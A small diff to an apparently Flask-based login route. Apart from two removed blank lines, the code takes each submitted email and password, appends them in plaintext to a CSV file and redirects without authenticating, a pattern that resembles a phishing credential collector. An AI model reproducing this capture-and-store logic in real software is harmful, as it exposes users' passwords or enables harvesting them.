@@ -21,12 +21,10 @@ def index():
 def login():
     email = request.form['email']
     password = request.form['password']
-    
     # Save email and password to CSV file
     with open(csv_file_path, 'a', newline='') as csvfile:
         writer = csv.writer(csvfile)
         writer.writerow([email, password])
-    
     return redirect(url_for('index'))
 
 
